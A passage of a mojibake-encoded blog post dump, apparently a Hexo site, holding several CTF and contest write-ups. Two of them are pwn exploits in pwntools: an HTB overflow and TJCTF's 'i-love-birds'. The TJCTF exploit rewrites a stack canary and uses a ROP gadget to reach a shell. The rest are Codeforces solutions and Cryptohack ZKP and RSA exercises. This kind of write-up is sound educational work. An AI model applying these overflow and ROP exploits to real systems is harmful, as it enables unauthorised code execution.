çš„åœ°å€æ˜¯0ï¼Œæ‰€ä»¥è¯´æˆ‘ä»¬åªéœ€è¦ç®¡ï¼ˆå¡«å……è¦†ç›–ï¼‰åé¢çš„éƒ¨åˆ†ï¼Œå³ï¼š 123+0000000000000004 _UNKNOWN *__return_address;+0000000000000008 _DWORD arg_0;+000000000000000C _DWORD arg_4; Exploit12345678910111213141516171819202122232425from pwn import *r = remote(&quot;94.237.54.192&quot;, 43134)a1 = -559038737a2 = -1059139571a1_hex = p32(a1, signed=True)a2_hex = p32(a2, signed=True)response = r.recvline()# print(response)payload = b&quot;A&quot; * (180+4+4) # è¦†ç›– buffer + æ—§ EBPpayload += p32(0x080491E2) # è¦†ç›–è¿”å›åœ°å€ä¸º flag() åœ°å€payload += b&quot;B&quot; * 4 # è¦†ç›–return_addressçš„Paddingpayload += a1_hex # ç¬¬ä¸€ä¸ªå‚æ•° (a1)payload += a2_hex # ç¬¬äºŒä¸ªå‚æ•° (a2)r.sendline(payload)r.recvline()print(r.recvline())# b&#x27;HTB&#123;0ur_Buff3r_1s_not_healthy&#125;&#x27;","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/categories/CTF/"},{"name":"Pwn","slug":"CTF/Pwn","permalink":"https://archer-baiyi.github.io/categories/CTF/Pwn/"}],"tags":[{"name":"HTB","slug":"HTB","permalink":"https://archer-baiyi.github.io/tags/HTB/"},{"name":"Pwn","slug":"Pwn","permalink":"https://archer-baiyi.github.io/tags/Pwn/"}]},{"title":"TJCTF 2025 pwn/i-love-birds Writeup","slug":"CTF/Pwn/TJCTF-2025-pwn-i-love-birds-Writeup","date":"2025-06-09T09:53:30.000Z","updated":"2025-06-10T19:01:56.328Z","comments":true,"path":"2025/06/09/CTF/Pwn/TJCTF-2025-pwn-i-love-birds-Writeup/","permalink":"https://archer-baiyi.github.io/2025/06/09/CTF/Pwn/TJCTF-2025-pwn-i-love-birds-Writeup/","excerpt":"TJCTF 2025æ¯”èµ›çš„Pwné¢˜i-love-birdsçš„é¢˜è§£ã€‚é€šè¿‡Buffer Overflowä¿®æ”¹è¿”å›åœ°å€ä»¥è°ƒç”¨ç›®æ ‡å‡½æ•°ï¼Œå¹¶ä¸”ä½¿ç”¨pop rbi;retæ¥ä¼ é€’å‚æ•°ã€‚","text":"é¢˜ç›® 12345678910111213141516171819202122232425262728293031323334#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;void gadget() &#123; asm(&quot;push $0x69;pop %rdi&quot;);&#125;void win(int secret) &#123; if (secret == 0xA1B2C3D4) &#123; system(&quot;/bin/sh&quot;); &#125;&#125;int main() &#123; setvbuf(stdout, NULL, _IONBF, 0); setvbuf(stdin, NULL, _IONBF, 0); unsigned int canary = 0xDEADBEEF; char buf[64]; puts(&quot;I made a canary to stop buffer overflows. Prove me wrong!&quot;); gets(buf); if (canary != 0xDEADBEEF) &#123; puts(&quot;No stack smashing for you!&quot;); exit(1); &#125; return 0;&#125; åˆ†æé¦–å…ˆæ³¨æ„åˆ°è¿™é“é¢˜æœ€æ ¸å¿ƒçš„æ¼æ´ï¼š 12char buf[64];gets(buf); ä¹Ÿå°±æ˜¯åˆ©ç”¨Buffer Overflowã€‚ è™½ç„¶è¯´è®¾ç½®äº†Stack Canaryï¼Œä½†æ˜¯ç”±äºçŸ¥é“å®ƒçš„å€¼ï¼Œç›´æ¥åœ¨Oveflowçš„æ—¶å€™ä¿è¯å®ƒçš„å€¼æ²¡æœ‰è¢«ä¿®æ”¹å³å¯ã€‚ æˆ‘ä»¬ä¸€å…±éœ€è¦åšåˆ°2ä»¶äº‹æƒ…ï¼š è°ƒç”¨win()å‡½æ•° ç»™win()å‡½æ•°ä¼ é€’0xA1B2C3D4ä½œä¸ºå‚æ•° åœ¨IDAçš„Exportsé¡µé¢ä¾¿å¯ç›´æ¥æŸ¥çœ‹win()å‡½æ•°çš„åœ°å€ï¼š 1win 00000000004011C4 å…¶æ¬¡ä¾¿æ˜¯ä¼ é€’å‚æ•°äº†ã€‚é¦–å…ˆæŸ¥çœ‹gadgetå‡½æ•°ï¼ˆåœ¨ä¸Šé¢çš„Exportsé¡µé¢ç›´æ¥ç‚¹å‡»gadgetå³å¯ï¼‰ï¼š 12345678text:00000000004011B6 endbr64.text:00000000004011BA push rbp.text:00000000004011BB mov rbp, rsp.text:00000000004011BE push 69h ; &#x27;i&#x27;.text:00000000004011C0 pop rdi.text:00000000004011C1 nop.text:00000000004011C2 pop rbp.text:00000000004011C3 retn å‘ç°æˆ‘ä»¬å¯ä»¥ç›´æ¥åˆ©ç”¨pop rdiä»¥åŠretn/retæ¥ä¼ é€’å‚æ•°ã€‚ä¸è¿‡è¿™é‡Œå’Œæœ€å¸¸è§çš„pop rdi; retä¸åŒçš„æ˜¯ï¼Œè¿™ä¸¤ä¸ªå‘½ä»¤ä¸­é—´è¿˜éš”äº†å…¶ä»–å†…å®¹ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦åœ¨ä¸­é—´éƒ¨åˆ†æ’å…¥Paddingä¿è¯æ‰€æœ‰çš„ä½ç½®éƒ½æ˜¯æ­£ç¡®çš„ã€‚ é™¤äº†ç›´æ¥æŸ¥çœ‹gadgetå‡½æ•°ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥ç›´æ¥é€šè¿‡ä½¿ç”¨Alt + tæœç´¢pop æˆ–è€…æ˜¯é€šè¿‡Alt + Bæœç´¢5F æ¥æ‰¾åˆ°pop rdiè¿™æ¡å‘½ä»¤ã€‚ï¼ˆå¦‚æœæ˜¯æŸ¥æ‰¾pop rdi; retçš„è¯åˆ™éœ€è¦æœç´¢â€5F C3â€œï¼‰ æœ€åå†æŸ¥çœ‹ä¸€ä¸‹main()å‡½æ•°çš„Stackçš„ç»“æ„ï¼š Exploit1234567891011121314151617181920from pwn import *r = remote(&quot;tjc.tf&quot;, 31625)payload = 76 * b&quot;A&quot; # å¡«æ»¡ bufpayload += p32(0xDEADBEEF) # ä¿®å¤ canaryï¼ˆ4å­—èŠ‚ï¼‰payload += 8 * b&quot;C&quot; # saved RBPï¼ˆå¯ä»¥éšä¾¿ï¼‰payload += p64(0x4011c0) # gadget: pop rdipayload += p64(0xA1B2C3D4) # å‚æ•°ï¼Œä¼ å…¥ win()payload+=p64(0x00) # rbpçš„Padding payload += p64(0x4011C4) # win() å‡½æ•°åœ°å€r.recvuntil(b&quot;Prove me wrong!&quot;)r.sendline(payload)r.interactive()# ls# flag.txt# run# cat flag.txt# tjctf&#123;1_gu355_y0u_f0und_th3_f4ke_b1rd_ch1rp_CH1rp_cH1Rp_Ch1rP_ch1RP&#125;","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/categories/CTF/"},{"name":"Pwn","slug":"CTF/Pwn","permalink":"https://archer-baiyi.github.io/categories/CTF/Pwn/"}],"tags":[{"name":"Writeup","slug":"Writeup","permalink":"https://archer-baiyi.github.io/tags/Writeup/"},{"name":"Pwn","slug":"Pwn","permalink":"https://archer-baiyi.github.io/tags/Pwn/"}]},{"title":"Codeforces Round 1029 (Div. 3) Writeup","slug":"ç®—æ³•ç«èµ›/Codeforce/Codeforces-Round-1029-Div-3-Writeup","date":"2025-06-08T15:52:05.000Z","updated":"2025-06-15T16:59:38.050Z","comments":true,"path":"2025/06/08/ç®—æ³•ç«èµ›/Codeforce/Codeforces-Round-1029-Div-3-Writeup/","permalink":"https://archer-baiyi.github.io/2025/06/08/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/Codeforce/Codeforces-Round-1029-Div-3-Writeup/","excerpt":"","text":"A. False Alarmé¢˜ç›® æ€è·¯é¦–å…ˆå…ˆéå†Arrayç›´åˆ°æ‰¾åˆ°ç¬¬ä¸€ä¸ª1ï¼Œå³å…³ç€çš„é—¨ã€‚ç„¶åè¿™ä¸ªæ—¶å€™ä½¿ç”¨å¼€å…³ï¼Œçœ‹æ˜¯å¦èƒ½åˆ°è¾¾ç»ˆç‚¹ï¼Œæˆ–è€…æ˜¯åˆ°è¾¾çš„ä½ç½®åé¢æ˜¯å¦å­˜åœ¨å…³ç€çš„é—¨ã€‚ ç®€åŒ–ä¸‹æ¥å°±æ˜¯ï¼šé¦–å…ˆæ‰¾åˆ°ç¬¬ä¸€ä¸ªå…³ç€çš„é—¨çš„ä½ç½®ï¼Œç„¶åç¡®å®šæœ€åä¸€ä¸ªå…³ç€çš„é—¨çš„ä½ç½®ï¼Œæœ€åæ ¹æ®ä»–ä»¬çš„è·ç¦»æ˜¯å¦å°äºxçš„å€¼æ¥åˆ¤æ–­æ˜¯å¦å¯ä»¥é€šè¡Œã€‚ ä»£ç 123456789101112131415161718192021222324252627282930313233#include &lt;iostream&gt;#include &lt;vector&gt;using namespace std;int main() { ios::sync_with_stdio(false); cin.tie(nullptr); int t; cin &gt;&gt; t; while (t--) { int n, x; cin &gt;&gt; n &gt;&gt; x; vector&lt;int&gt; a(n); for (int &amp;v : a) cin &gt;&gt; v; int first = -1, last = -1; for (int i = 0; i &lt; n; ++i) { if (a[i] == 1) { if (first == -1) first = i; // ç¬¬ä¸€æ¬¡é‡åˆ°å…³é—¨ last = i; // ä¸æ–­åˆ·æ–°æœ€åä¸€æ¬¡ } } // å¿…æœ‰å…³é—¨ï¼Œæ‰€ä»¥ firstã€last ä¸€å®šéƒ½è¢«èµ‹å€¼ if (last - first + 1 &lt;= x) cout &lt;&lt; \"YES\\n\"; else cout &lt;&lt; \"NO\\n\"; } return 0;} B. Shrinké¢˜ç›® æ€è·¯ä¸éš¾å‘ç°ï¼Œå¯¹äºä»»æ„çš„nï¼Œæˆ‘ä»¬åªéœ€è¦æ„é€ ä¸€ä¸ªè¿™æ ·çš„æ•°åˆ—å³å¯æ»¡è¶³è¦æ±‚ï¼š 1,3,5,..,n-1,n,n-2,...,2å³å‰åŠæ®µæ˜¯å¥‡æ•°é€’å¢ï¼ŒååŠæ®µæ˜¯å¶æ•°é€’å‡ã€‚ ä»£ç 12345678910111213141516171819202122232425#include &lt;iostream&gt;using namespace std;int main() { int t; cin &gt;&gt; t; while (t--) { int n; cin &gt;&gt; n; // å¥‡æ•° for (int i = 1; i &lt;= n; i += 2) { cout &lt;&lt; i &lt;&lt; \" \"; } // å¶æ•° int start = (n % 2 == 0) ? n : n - 1; for (int i = start; i &gt;= 2; i -= 2) { cout &lt;&lt; i &lt;&lt; \" \"; } cout &lt;&lt; '\\n'; } return 0;}","categories":[{"name":"ç®—æ³•ç«èµ›","slug":"ç®—æ³•ç«èµ›","permalink":"https://archer-baiyi.github.io/categories/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/"},{"name":"Codeforce","slug":"ç®—æ³•ç«èµ›/Codeforce","permalink":"https://archer-baiyi.github.io/categories/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/Codeforce/"}],"tags":[{"name":"ç®—æ³•ç«èµ›","slug":"ç®—æ³•ç«èµ›","permalink":"https://archer-baiyi.github.io/tags/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/"},{"name":"Codeforce","slug":"Codeforce","permalink":"https://archer-baiyi.github.io/tags/Codeforce/"}]},{"title":"Cyptohack ZKPs Writeup","slug":"CTF/Crypto/Cyptohack-ZKPs-Writeup","date":"2025-06-07T07:08:55.000Z","updated":"2025-06-07T09:08:22.759Z","comments":true,"path":"2025/06/07/CTF/Crypto/Cyptohack-ZKPs-Writeup/","permalink":"https://archer-baiyi.github.io/2025/06/07/CTF/Crypto/Cyptohack-ZKPs-Writeup/","excerpt":"","text":"ä»€ä¹ˆæ˜¯é›¶çŸ¥è¯†è¯æ˜A zero-knowledge proof (ZKP) is a technique that enables one party (the prover) to demonstrate to another party (the verifier) the truth of a certain statement without revealing any additional information besides the fact that the statement is true. The core idea behind zero-knowledge proofs is that while itâ€™s straightforward to prove you have certain knowledge by disclosing it, the real challenge lies in proving you have that knowledge without actually revealing the knowledge itself or any details about it. é›¶çŸ¥è¯†è¯æ˜ï¼ˆZero-Knowledge Proofï¼Œç®€ç§°ZKPï¼‰æ˜¯ä¸€ç§æŠ€æœ¯ï¼Œä½¿ä¸€æ–¹ï¼ˆç§°ä¸ºâ€œè¯æ˜è€…â€ï¼‰èƒ½å¤Ÿå‘å¦ä¸€æ–¹ï¼ˆç§°ä¸ºâ€œéªŒè¯è€…â€ï¼‰è¯æ˜æŸä¸ªé™ˆè¿°çš„çœŸå®æ€§ï¼ŒåŒæ—¶ä¸æ³„éœ²é™¤è¯¥é™ˆè¿°ä¸ºçœŸè¿™ä¸€äº‹å®ä»¥å¤–çš„ä»»ä½•å…¶ä»–ä¿¡æ¯ã€‚é›¶çŸ¥è¯†è¯æ˜çš„æ ¸å¿ƒç†å¿µåœ¨äºï¼šå°½ç®¡é€šè¿‡ç›´æ¥æŠ«éœ²ä¿¡æ¯æ¥è¯æ˜è‡ªå·±æ‹¥æœ‰æŸç§çŸ¥è¯†æ˜¯è¾ƒä¸ºç›´æ¥çš„æ–¹å¼ï¼Œä½†çœŸæ­£çš„æŒ‘æˆ˜åœ¨äºå¦‚ä½•åœ¨ä¸æš´éœ²è¯¥çŸ¥è¯†æœ¬èº«æˆ–å…¶ä»»ä½•ç»†èŠ‚çš„å‰æä¸‹ï¼Œä»èƒ½è¯æ˜è‡ªå·±ç¡®å®æŒæ¡äº†è¿™é¡¹çŸ¥è¯†ã€‚ ä¾‹å­ï¼šä½ éœ€è¦å‘ä½ çš„ä¸€ä½è‰²ç›²æœ‹å‹ç»´å…‹å¤šè¯æ˜ï¼Œä¸¤åªå½¢çŠ¶å®Œå…¨ç›¸åŒçš„çƒï¼ˆä¸€åªæ˜¯çº¢è‰²ï¼Œå¦ä¸€åªæ˜¯ç»¿è‰²ï¼‰æ˜¯ä¸åŒçš„ï¼Œä½†åˆä¸èƒ½é€éœ²å“ªåªæ˜¯çº¢çš„ã€å“ªåªæ˜¯ç»¿çš„ã€‚ä¸ºæ­¤ï¼Œä½ é‡‡ç”¨äº†ä¸€ç§ç‰¹å®šçš„è¯æ˜ç³»ç»Ÿã€‚ ä½ å…ˆå‘ç»´å…‹å¤šå±•ç¤ºè¿™ä¸¤åªçƒã€‚ä»–ç”±äºæ— æ³•åˆ†è¾¨é¢œè‰²ï¼Œçœ‹ä¸å‡ºå®ƒä»¬çš„åŒºåˆ«ã€‚æ¥ç€ä»–å°†çƒè—èµ·æ¥ï¼Œéšæœºé€‰å‡ºä¸€åªç»™ä½ çœ‹ï¼Œç„¶åå¯èƒ½ä¼šå°†å®ƒæ¢æˆå¦ä¸€åªï¼Œä¹Ÿå¯èƒ½ä¸æ¢ï¼Œå†æ¬¡å±•ç¤ºç»™ä½ ã€‚ä½ éœ€è¦åˆ¤æ–­ä»–æ˜¯å¦äº¤æ¢äº†çƒã€‚ç”±äºä½ èƒ½é€šè¿‡é¢œè‰²åˆ†è¾¨çƒçš„ä¸åŒï¼Œä½ æ¯æ¬¡éƒ½èƒ½å‡†ç¡®åˆ¤æ–­ä»–æ˜¯å¦æ›´æ¢äº†çƒã€‚ è¿™ä¸ªè¿‡ç¨‹é‡å¤è¶³å¤Ÿå¤šçš„æ¬¡æ•°ï¼ˆä¾‹å¦‚50æ¬¡ï¼‰ï¼Œè€Œä½ æ¯æ¬¡éƒ½èƒ½æ­£ç¡®è¯†åˆ«æ˜¯å¦æ¢äº†çƒï¼Œè¿™è®©ç»´å…‹å¤šç¡®ä¿¡ä¸¤åªçƒç¡®å®ä¸åŒï¼Œä½†ä»–ä¾ç„¶æ— æ³•å¾—çŸ¥å“ªåªæ˜¯çº¢è‰²ï¼Œå“ªåªæ˜¯ç»¿è‰²ã€‚è¿™ä¸ªè¯æ˜è¿‡ç¨‹æ²¡æœ‰æ³„éœ²é™¤â€œè¿™ä¸¤åªçƒä¸åŒâ€ä¹‹å¤–çš„ä»»ä½•ä¿¡æ¯ï¼Œå› æ­¤ï¼Œè¿™æ˜¯ä¸€ä¸ªé›¶çŸ¥è¯†è¯æ˜çš„ä¾‹å­ã€‚ Sigma ProtocolZKP Introductioné¢˜ è§£1crypto&#123;1985&#125; è®ºæ–‡é“¾æ¥ï¼šhttps://dl.acm.org/doi/10.1145/22145.22178https://dl.acm.org/doi/pdf/10.1145/22145.22178 Proofs of Knowledgeé¢˜ æ³¨æ„åˆ°ï¼š g^z \\equiv g^{r+ew} \\equiv g^r \\cdot (g^w)^e \\equiv ay^e \\text{ mod } p è®ºæ–‡é“¾æ¥ï¼šhttps://cs.au.dk/~ivan/Sigma.pdf é™„ä»¶ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354import randomfrom utils import listenerFLAG = &quot;crypto&#123;????????????????????????&#125;&quot;# Diffie-Hellman group (512 bits)# p = 2*q + 1 where p,q are both prime, and 2 modulo p generates a group of order qp = 0x1ed344181da88cae8dc37a08feae447ba3da7f788d271953299e5f093df7aaca987c9f653ed7e43bad576cc5d22290f61f32680736be4144642f8bea6f5bf55efq = 0xf69a20c0ed4465746e1bd047f57223dd1ed3fbc46938ca994cf2f849efbd5654c3e4fb29f6bf21dd6abb662e911487b0f9934039b5f20a23217c5f537adfaaf7g = 2# w,y for the relation `g^w = y mod P` we want to prove knowledge of# w = random.randint(0,q)# y = pow(g,w,P)w = 0x5a0f15a6a725003c3f65238d5f8ae4641f6bf07ebf349705b7f1feda2c2b051475e33f6747f4c8dc13cd63b9dd9f0d0dd87e27307ef262ba68d21a238be00e83y = 0x514c8f56336411e75d5fa8c5d30efccb825ada9f5bf3f6eb64b5045bacf6b8969690077c84bea95aab74c24131f900f83adf2bfe59b80c5a0d77e8a9601454e5assert (y%p) &gt;= 1assert pow(y, q, p) == 1class Challenge: def __init__(self): self.before_input = &quot;Prove to me that you know an w such that g^w = y mod p. Send me a = g^r mod p for some random r in range(q)\\n&quot; self.state = &quot;CHALLENGE&quot; def challenge(self, msg): if self.state == &quot;CHALLENGE&quot;: # Prover sends a randomly sampled `A` value from Z_p* to verifier self.a = msg[&quot;a&quot;] if (self.a%p) &lt; 1 or pow(self.a, q, p) != 1: self.exit = True return &#123;&quot;error&quot;: &quot;Invalid value&quot;&#125; # Verifier sends a random challenge sampled from range(0, 2^t) where 2^t &lt;= q self.e = random.randint(0,2**511) self.state = &quot;PROVE&quot; return &#123;&quot;e&quot;: self.e, &quot;message&quot;: &quot;send me z = r + e*w mod q&quot;&#125; elif self.state == &quot;PROVE&quot;: # Prover sends z = r + e*w mod q to the Verifier z = msg[&quot;z&quot;] self.exit = True # Verifier checks g^z = A*h^e mod p if pow(g,z,p) == (self.a*pow(y,self.e,p)) % p: return &#123;&quot;flag&quot;: FLAG, &quot;message&quot;: &quot;You convinced me you know an `w` such that g^w = y mod p!&quot;&#125; else: return &#123;&quot;error&quot;: &quot;something went wrong :(&quot;&#125;import builtins; builtins.Challenge = Challenge # hack to enable challenge to be run locally, see https://cryptohack.org/faq/#listenerlistener.start_server(port=13425) è§£æ³¨æ„ï¼Œè¿™é‡Œç»™æœåŠ¡å™¨å‘é€å‚æ•°å¿…é¡»ç”¨JSONæ ¼å¼ï¼Œå®ƒè¿”å›çš„ä¹Ÿéƒ½æ˜¯è¿™ä¸ªæ ¼å¼çš„ã€‚ 1234567891011121314151617181920212223242526272829from pwn import *import jsonimport randomp = 0x1ed344181da88cae8dc37a08feae447ba3da7f788d271953299e5f093df7aaca987c9f653ed7e43bad576cc5d22290f61f32680736be4144642f8bea6f5bf55efq = 0xf69a20c0ed4465746e1bd047f57223dd1ed3fbc46938ca994cf2f849efbd5654c3e4fb29f6bf21dd6abb662e911487b0f9934039b5f20a23217c5f537adfaaf7g = 2w = 0x5a0f15a6a725003c3f65238d5f8ae4641f6bf07ebf349705b7f1feda2c2b051475e33f6747f4c8dc13cd63b9dd9f0d0dd87e27307ef262ba68d21a238be00e83r = remote(&quot;socket.cryptohack.org&quot;, 13425)random_r = random.randint(0, q)a = pow(g, random_r, p)# å‘é€ aï¼Œæ³¨æ„æ˜¯ JSON æ ¼å¼r.sendafter(b&quot;for some random r in range(q)\\n&quot;,json.dumps(&#123;&quot;a&quot;: a&#125;).encode())line = r.recvline()response = json.loads(line.decode())e = response[&quot;e&quot;]z = (random_r + e * w) % qr.sendline(json.dumps(&#123;&quot;z&quot;: z&#125;).encode())print(r.recvline().decode())# &#123;&quot;flag&quot;: &quot;crypto&#123;sigma_protocol_complete!&#125;&quot;, &quot;message&quot;: &quot;You convinced me you know an `w` such that g^w = y mod p!&quot;&#125; Special Soundnessç®€å•æ¥è®²å°±æ˜¯å¦‚æœ2æ¬¡è¯æ˜ä½¿ç”¨çš„æ˜¯ä¸€ä¸ªaï¼Œé‚£ä¹ˆå°±å¯ä»¥é€šè¿‡è¿™äº›ä¼ é€’çš„å‚æ•°è®¡ç®—å‡ºwæ¥ã€‚ é¢˜ è§£è¿™é“é¢˜ä¾æ—§ç”¨çš„ä¸Šé¢æåˆ°çš„Protocolã€‚ ç”±äºå¯ä»¥ä»»æ„æŒ‘é€‰$e$çš„å€¼ï¼Œæ‰€ä»¥æœ€ç®€å•çš„åŠæ³•å°±æ˜¯ç¬¬ä¸€è½®é€‰æ‹©$e_1=1$ï¼Œç¬¬äºŒè½®é€‰æ‹©$e_2=2$ï¼Œé‚£ä¹ˆï¼ˆç”±äº$a_1=a_2$ï¼‰å°±æœ‰ï¼š z_2-z_1 \\equiv (r_1+e_1w) - (r_2+e_2w) \\equiv w \\text{ mod } q1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950from pwn import *import jsonimport randomfrom Crypto.Util.number import long_to_bytesp = 0x1ed344181da88cae8dc37a08feae447ba3da7f788d271953299e5f093df7aaca987c9f653ed7e43bad576cc5d22290f61f32680736be4144642f8bea6f5bf55efq = 0xf69a20c0ed4465746e1bd047f57223dd1ed3fbc46938ca994cf2f849efbd5654c3e4fb29f6bf21dd6abb662e911487b0f9934039b5f20a23217c5f537adfaaf7g = 2r = remote(&quot;socket.cryptohack.org&quot;, 13426)# ç¬¬ä¸€è½®r.recvuntil(b&quot;such that y = g^w mod p.\\n&quot;)line = r.recvline()response1 = json.loads(line.decode())a1 = response1[&quot;a&quot;]print(response1[&quot;message&quot;])# send random e in range 0 &lt;= e &lt; 2^511e = 1r.sendline(json.dumps(&#123;&quot;e&quot;: e&#125;).encode())line = r.recvline()response1 = json.loads(line.decode())z1 = response1[&quot;z&quot;]print(response1[&quot;message&quot;])# not convinced? I&#x27;ll happily do it again!# --------------------------------------------------------------------# ç¬¬äºŒè½®line = r.recvline()response2 = json.loads(line.decode())a2 = response2[&quot;a2&quot;]print(response2[&quot;message&quot;])# send random e in range 0 &lt;= e &lt; 2^511e = 2r.sendline(json.dumps(&#123;&quot;e&quot;: e&#125;).encode())line = r.recvline()response2 = json.loads(line.decode())z2 = response2[&quot;z2&quot;]print(response1[&quot;message&quot;])# not convinced? I&#x27;ll happily do it again!# --------------------------------------------------------------------w = long_to_bytes((z2-z1)%q)print(w)# b&#x27;crypto&#123;specially_sound_sigmas&#125;\\xf7c\\xb0H\\xa1j\\t\\x9f\\x9ab`%\\xf7\\xe3\\x1552\\x15\\xda%\\xf7\\xf5yk\\xd2\\xa7\\x1f\\xbb3\\x8f\\xfd&amp;&#x27; å½“ç„¶å…¶å®é€‰æ‹©éšæœºçš„$e$ä¹Ÿå¯ä»¥è®¡ç®—å‡º$w$ï¼š w \\equiv (z_2-z_1) \\cdot (e_2-e_1)^{-1} \\text{ mod } q1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950from pwn import *import jsonimport randomfrom Crypto.Util.number import long_to_bytesp = 0x1ed344181da88cae8dc37a08feae447ba3da7f788d271953299e5f093df7aaca987c9f653ed7e43bad576cc5d22290f61f32680736be4144642f8bea6f5bf55efq = 0xf69a20c0ed4465746e1bd047f57223dd1ed3fbc46938ca994cf2f849efbd5654c3e4fb29f6bf21dd6abb662e911487b0f9934039b5f20a23217c5f537adfaaf7g = 2r = remote(&quot;socket.cryptohack.org&quot;, 13426)# ç¬¬ä¸€è½®r.recvuntil(b&quot;such that y = g^w mod p.\\n&quot;)line = r.recvline()response1 = json.loads(line.decode())a1 = response1[&quot;a&quot;]print(response1[&quot;message&quot;])# send random e in range 0 &lt;= e &lt; 2^511e1 = randint(0,2**511)r.sendline(json.dumps(&#123;&quot;e&quot;: e1&#125;).encode())line = r.recvline()response1 = json.loads(line.decode())z1 = response1[&quot;z&quot;]print(response1[&quot;message&quot;])# not convinced? I&#x27;ll happily do it again!# --------------------------------------------------------------------# ç¬¬äºŒè½®line = r.recvline()response2 = json.loads(line.decode())a2 = response2[&quot;a2&quot;]print(response2[&quot;message&quot;])# send random e in range 0 &lt;= e &lt; 2^511e2 = randint(0,2**511)r.sendline(json.dumps(&#123;&quot;e&quot;: e2&#125;).encode())line = r.recvline()response2 = json.loads(line.decode())z2 = response2[&quot;z2&quot;]print(response1[&quot;message&quot;])# not convinced? I&#x27;ll happily do it again!# --------------------------------------------------------------------w = long_to_bytes((z2-z1) * pow(e2-e1,-1,q)%q)print(w)# b&#x27;crypto&#123;specially_sound_sigmas&#125;\\xf7c\\xb0H\\xa1j\\t\\x9f\\x9ab`%\\xf7\\xe3\\x1552\\x15\\xda%\\xf7\\xf5yk\\xd2\\xa7\\x1f\\xbb3\\x8f\\xfd&amp;&#x27; **é¢˜è§£**é¢˜è§£","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/categories/CTF/"},{"name":"Crypto","slug":"CTF/Crypto","permalink":"https://archer-baiyi.github.io/categories/CTF/Crypto/"}],"tags":[{"name":"Crypto","slug":"Crypto","permalink":"https://archer-baiyi.github.io/tags/Crypto/"},{"name":"Cryptohack","slug":"Cryptohack","permalink":"https://archer-baiyi.github.io/tags/Cryptohack/"},{"name":"Writeup","slug":"Writeup","permalink":"https://archer-baiyi.github.io/tags/Writeup/"},{"name":"Zero-knowledge proofs","slug":"Zero-knowledge-proofs","permalink":"https://archer-baiyi.github.io/tags/Zero-knowledge-proofs/"},{"name":"é›¶çŸ¥è¯†è¯æ˜","slug":"é›¶çŸ¥è¯†è¯æ˜","permalink":"https://archer-baiyi.github.io/tags/%E9%9B%B6%E7%9F%A5%E8%AF%86%E8%AF%81%E6%98%8E/"}]},{"title":"Cyptohack Public-Key_Cryptography Writeup","slug":"CTF/Crypto/Cyptohack-Public-Key-Cryptography-Writeup","date":"2025-06-03T18:29:30.000Z","updated":"2025-06-04T15:14:35.566Z","comments":true,"path":"2025/06/03/CTF/Crypto/Cyptohack-Public-Key-Cryptography-Writeup/","permalink":"https://archer-baiyi.github.io/2025/06/03/CTF/Crypto/Cyptohack-Public-Key-Cryptography-Writeup/","excerpt":"","text":"è¿™ä¸ªCourseé‡Œæœ‰å¾ˆå¤§ä¸€éƒ¨åˆ†éƒ½æ˜¯å…³äºRSAåŠ å¯†çš„ã€‚å…³äºRSAçš„åŸºæœ¬åŸç†ä»¥åŠåŸºæœ¬çš„æ”»å‡»æ–¹æ³•å¯ä»¥çœ‹æˆ‘çš„å¦ä¸€ç¯‡åšå®¢ï¼šRSAåŠ è§£å¯†ä»¥åŠæ”»å‡»æ–¹æ³•ã€‚ Modular Exponentiationé¢˜ è§£12print(pow(101,17,22663))# 19906 Public Keysé¢˜ è§£12print(pow(12,65537,17*23))# 301 Eulerâ€™s Totienté¢˜ è§£12345p = 857504083339712752489993810777q = 1029224947942998075080348647219phi = (p-1)*(q-1)print(phi)# 882564595536224140639625987657529300394956519977044270821168 Private Keysé¢˜ è§£1234567p = 857504083339712752489993810777q = 1029224947942998075080348647219phi = (p-1)*(q-1)e = 65537d = pow(e,-1,phi)print(d)# 121832886702415731577073962957377780195510499965398469843281 RSA Decryptioné¢˜ è§£ä¸éš¾å‘ç°è¿™ä¸ªNå°±æ˜¯å‰å‡ é“é¢˜ç»™çš„p,qçš„ä¹˜ç§¯ã€‚ 1234567891011p = 857504083339712752489993810777q = 1029224947942998075080348647219N = 882564595536224140639625987659416029426239230804614613279163assert N == p*qphi = (p-1)*(q-1)e = 65537d = pow(e,-1,phi)c = 77578995801157823671636298847186723593814843845525223303932m = pow(c,d,N)print(m)# 13371337 RSA Signaturesé¢˜ è§£12345678910111213141516from Crypto.Hash import SHA256from Crypto.Util.number import bytes_to_longN = 15216583654836731327639981224133918855895948374072384050848479908982286890731769486609085918857664046075375253168955058743185664390273058074450390236774324903305663479046566232967297765731625328029814055635316002591227570271271445226094919864475407884459980489638001092788574811554149774028950310695112688723853763743238753349782508121985338746755237819373178699343135091783992299561827389745132880022259873387524273298850340648779897909381979714026837172003953221052431217940632552930880000919436507245150726543040714721553361063311954285289857582079880295199632757829525723874753306371990452491305564061051059885803d = 11175901210643014262548222473449533091378848269490518850474399681690547281665059317155831692300453197335735728459259392366823302405685389586883670043744683993709123180805154631088513521456979317628012721881537154107239389466063136007337120599915456659758559300673444689263854921332185562706707573660658164991098457874495054854491474065039621922972671588299315846306069845169959451250821044417886630346229021305410340100401530146135418806544340908355106582089082980533651095594192031411679866134256418292249592135441145384466261279428795408721990564658703903787956958168449841491667690491585550160457893350536334242689message = b&quot;crypto&#123;Immut4ble_m3ssag1ng&#125;&quot;h = SHA256.new(message).digest()h_int = bytes_to_long(h)signature = pow(h_int, d, N)print(signature)# 13480738404590090803339831649238454376183189744970683129909766078877706583282422686710545217275797376709672358894231550335007974983458408620258478729775647818876610072903021235573923300070103666940534047644900475773318682585772698155617451477448441198150710420818995347235921111812068656782998168064960965451719491072569057636701190429760047193261886092862024118487826452766513533860734724124228305158914225250488399673645732882077575252662461860972889771112594906884441454355959482925283992539925713424132009768721389828848907099772040836383856524605008942907083490383109757406940540866978237471686296661685839083475 Factoringé¢˜ 